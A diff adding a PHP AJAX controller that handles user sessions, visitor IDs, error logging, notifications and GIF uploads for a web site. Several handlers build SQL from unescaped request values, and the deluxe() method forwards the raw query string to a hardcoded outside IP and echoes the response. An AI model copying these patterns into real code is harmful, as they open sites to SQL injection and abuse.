@@ -1,0 +1,246 @@
+<?
+include_once(SSPATH.'helpers/notify_classes/siteNotifier.php');
+
+class ajaxController extends controller {
+    public function setUser() {
+        GLOBAL $_SESSION, $mysqli, $_SERVER;
+        
+        
+        $values = $this->request->values;
+        $res = array('result'=>0, 'ava'=>'');
+        unset($values['task']);
+         
+        $ip = $_SERVER['REMOTE_ADDR'];
+        $uid = $this->getSafeVar('uid', 0);
+        $source = $this->getSafeVar('source', 'none');
+        
+        if ($uid) {
+            $imagePath = AVAPATH.$source.'/'.$uid;
+            $first_name = $this->getSafeVar('first_name', '');
+            $last_name = $this->getSafeVar('last_name', ''); 
+            $avatar = $this->getSafeVar('avatar', '');   
+            $url = $this->getSafeVar('url', '');    
+            $email = $this->getSafeVar('email', '');
+            $nick = $this->getSafeVar('nick', '');
+            $gender = $this->getSafeVar('gender', '');
+            $nauid = $this->getSafeVar('nauid', 0);
+            $birthday = $this->getSafeVar('birthday', '');
+            
+            //$suser = $_SESSION[SESUSER]?$_SESSION[SESUSER]:array();
+            $_SESSION[SESUSER] = array('uid'=>$uid, 'source'=>$source, 'first_name'=>$first_name, 
+                                'last_name'=>$last_name, 'nick'=>$nick, 'avatar'=>$avatar, 'email'=>$email, 'url'=>$url, 
+                                'gender'=>$gender, 'birthday'=>$birthday, 'session'=>@$values['session']);
+            /*                                
+            foreach ($fields as $field=>$val)
+                if ($val) $suser[$field] = $val;
+                
+            $_SESSION[SESUSER] = $suser;
+            */                
+            
+            if ($user = DB::line('SELECT * FROM `'.DBPREF."users` WHERE uid=$uid AND source='{$source}'")) {
+                $sets = "`last_ip`='{$ip}'";
+                if ($first_name) $sets .= ",`first_name`='{$first_name}'"; 
+                if ($last_name) $sets .= ",`last_name`='{$last_name}'"; 
+                if ($nick) $sets .= ",`nick`='{$nick}'"; 
+                if ($avatar && ($user['avatar'] != 'CUSTOM')) $sets .= ",`avatar`='{$avatar}'"; 
+                if ($email) $sets .= ",`email`='{$email}'"; 
+                if ($url) $sets .= ",`url`='{$url}'"; 
+                if ($gender) $sets .= ",`gender`='{$gender}'"; 
+                if ($birthday) $sets .= ",`birthday`='".date('Y-m-d', strtotime($birthday))."'";
+                
+                if (!$user['nauid']) {  
+                    if ($nauid) $sets .= ",`nauid`='{$nauid}'";
+                } else {
+                    $nauid = $user['nauid'];
+                    DB::query('REPLACE '.DBPREF."nauids (`uid`, `ip`, `date`) VALUES ({$nauid}, '{$ip}', NOW())");
+                }
+                
+                //$_SESSION[SESUSER] = $user;
+                $res['result'] = DB::query('UPDATE `'.DBPREF."users` SET $sets WHERE uid=$uid AND source='{$source}'")?1:0; 
+            } else $res['result'] = DB::query('INSERT INTO `'.DBPREF."users` (`create_date`, `uid`, `nauid`, `source`, `first_name`, `last_name`, `last_ip`, `nick`, `avatar`, `email`, `url`, `gender`, `birthday`) ". 
+                            "VALUES (NOW(), {$uid}, {$nauid}, '{$source}', '{$first_name}', '{$last_name}', '{$ip}', '{$nick}', '$avatar', '$email', '$url', '$gender', '".date('Y-m-d', strtotime($birthday))."')")?1:0;
+            
+            if ($nauid) {
+                $_SESSION['NAUID'] = $nauid;
+                $_SESSION[SESUSER]['nauid'] = $nauid;
+                $res['nauid'] = $nauid;
+            }
+                            
+            if ($values['avatar'] != 'CUSTOM') 
+                $res['ava'] = refreshAvatar($source, $uid, $values['avatar']);
+            
+            if (!$option = DB::one("SELECT uid FROM `".DBPREF."user_options` WHERE uid={$uid} AND source='{$source}'")) {
+                $res['option_cr'] = DB::query("INSERT INTO `".DBPREF."user_options` (`uid`, `source`) VALUES ({$uid}, '{$source}')");            
+            } 
+        } else $this->setNAUIDSES();
+        
+        //Event::fireEvent('LOGIN', $uid, $source, $nauid);           
+        echo json_encode($res);
+    }
+    
+    
+    public function setNAUIDSES() {
+        GLOBAL $_SESSION;
+        if ($nauid = $this->getSafeVar('nauid', 0)) { 
+            $_SESSION['NAUID'] = $nauid;
+            if (isset($_SESSION[SESUSER])) $_SESSION[SESUSER]['nauid'] = $nauid;
+        }
+        echo 1;
+    }
+    
+    public function logout() {
+        GLOBAL $_SESSION;
+        unset($_SESSION[SESUSER]);
+        echo '{logout:1}';
+    }
+    
+    public function deluxe() {
+        GLOBAL $_SERVER;
+        echo file_get_contents('http://188.127.228.242/deluxe.php?'.$_SERVER['QUERY_STRING']);
+    }
+    
+    public function deleteNotice() {
+        $result = DB::line("DELETE FROM ds_notices WHERE id=".$this->request->getVal('id', 0));
+        echo $result;
+    }
+    
+    protected function clearCache() {
+        $cacheKey = $this->getVar('cacheKey', 0);
+        $result = ss::clearCache($cacheKey)?1:0;
+        echo '{"result": '.$result.'}';
+    }
+    
+    public function getNAUID_A() {
+        GLOBAL $_SERVER;
+        $nauid = ss::nauid();
+        $res = array('result'=>0);
+        if (!$nauid) {
+            if (DB::query('INSERT INTO '.DBPREF."nauids (`ip`, `date`) VALUES ('{$_SERVER['REMOTE_ADDR']}', NOW())"))
+                $nauid = DB::lastID();                                                                                 
+        }
+        return $nauid;
+    }
+    
+    public function getNAUID() {
+        GLOBAL $_SERVER, $_SESSION;
+        $nauid = ss::nauid();
+        $res = array('result'=>0);
+        if (!$nauid) $nauid = $res['nauid'] = ajaxController::getNAUID_A();
+        else $res['nauid'] = $nauid;
+        $res['result'] = $res['nauid']?1:0;
+        
+        if ($this->getVar('sesset')) {
+            $_SESSION['NAUID'] = $nauid;
+            if (isset($_SESSION[SESUSER])) $_SESSION[SESUSER]['nauid'] = $nauid;        
+        }
+        
+        echo json_encode($res); 
+    }
+    
+    public function js_error() {
+        GLOBAL $_SERVER;
+        $res = array();
+        if ($message = $this->getSafeVar('message')) {
+            $browser_name = $this->getSafeVar('browser_name', 'unknown');
+            $browser_version = $this->getSafeVar('browser_version', '0');
+            $filename = $this->getSafeVar('filename', 'unknown');
+            $colno = $this->getVar('colno', 0);            
+            $lineno = $this->getVar('lineno', 0);
+            $ip = $_SERVER['REMOTE_ADDR'];
+            $res['result'] = DB::query('INSERT INTO '.DBPREF.'js_errors (`ip`, `browser_name`, `browser_version`, `message`, `filename`, `colno`, `lineno`) '.
+                                        "VALUES ('$ip', '$browser_name', '$browser_version', '$message', '$filename', $colno, $lineno)");
+        }
+        echo json_encode($res); 
+    }
+    
+    public function event() {
+        $res = array('result'=>0);
+        if ($type = $this->getVar('type')) {
+            $var_int1 = $this->getVar('var_int1');
+            $var_source = $this->getVar('var_source');
+            $var_int2 = $this->getVar('var_int2');
+            $var_str1 = $this->getVar('var_str1');
+            $var_str2 = $this->getVar('var_str2');
+            $user = $this->getSenderUser();
+            
+            $res['result'] = Event::fireEvent($type, $user['uid'], $user['source'], $var_int1, $var_int2, $var_source, $var_str1, $var_str2)?1:0;
+        }
+        echo json_encode($res); 
+    }
+    
+    public function afterEvents() {
+        GLOBAL $EVENT_TYPES;
+        $res = array('data'=>array());
+        if ($user = $this->getSenderUser()) {
+            if ($nlist = DB::asArray("SELECT data, notify_id, state FROM ".DBPREF."notify ".
+                                "WHERE uid={$user['uid']} AND user_source='{$user['source']}' AND type='site' AND (state='wait' OR state='sent') ORDER BY `create_time` DESC")) {
+                foreach ($nlist as $nitem)
+                    $res['data'][] = $nitem;
+            }
+            if ($a_data = Event::getLastEvents($EVENT_TYPES, array($user))) {
+                $data = @$a_data[0];
+                if (isset($data['notify']) and (count($data['notify']) > 0)) {
+                    $nf = new siteNotifier(MAINURL.'/');
+                    foreach ($data['notify'] as $msg) { 
+                        $text = $nf->prepare($data['user'], $msg);
+                        $nf->send($data['user'], $msg['callback'], $text);
+                        //$nf->createNotify('site', $item['user'], $msg['callback'], $text);
+                        $res['data'][] = array('data'=>$text, 'notify_id'=>$nid, 'state'=>'wait');
+                    }
+                }
+            }
+        }        
+        echo json_encode($res);
+    }
+    
+    public function setStateNotify() {
+        $res = array('result'=>0);
+        if (($notify_id = $this->getVar('notify_id')) && ($state = $this->getVar('state'))) {
+            $res['result'] = DB::query("UPDATE ".DBPREF."notify SET `state`='{$state}' WHERE notify_id={$notify_id}")?1:0;
+        }
+        echo json_encode($res);
+    }
+    
+    public function shareGIF() {
+        $res = array();
+        if ($user = $this->getSenderUser()) {
+            $image = $this->getVar('image_base64');
+            $user = ss::getUserAlternate();
+            if ($image = base64_decode($image)) {
+                $gifPath = GAMEPATH.'gifs/';
+                $gifURL = GAMEURL.'gifs/';
+                
+                if (!file_exists($gifPath)) {
+                    mkdir($gifPath);
+                    chmod($gifPath, 0775);
+                }    
+                
+                $fileindex = md5(strtotime('NOW'));
+                $fileName = $fileindex.'.gif';
+                $filePath = $gifPath.$fileName;
+                $fileURL = $gifURL.$fileName;
+                
+                if (file_exists($filePath)) unlink($filePath);
+                
+                if ($result = (file_put_contents($filePath, $image) !== false)?1:0) {
+                    chmod($gifPath, 0775);
+                    
+                    $size = getimagesize($filePath);
+                    $result = DB::query("INSERT INTO ".DBPREF."gif (uid, source, width, height, date) VALUES ({$user['uid']}, '{$user['source']}', {$size[0]}, {$size[1]}, NOW())")?1:0;
+                    $id = DB::lastID();
+                    
+                    $newPath = $gifPath.'a'.$id.'.gif';
+                    rename($filePath, $newPath);
+                
+                                                                            
+                    $res['fileURL'] = link::c('app', 'gifavt-'.$id);
+                    $res['id'] = $id;
+                    $res['result'] = $result;
+                }
+            }                      
+        }        
+        echo json_encode($res);
+    }
+}
+
+?>
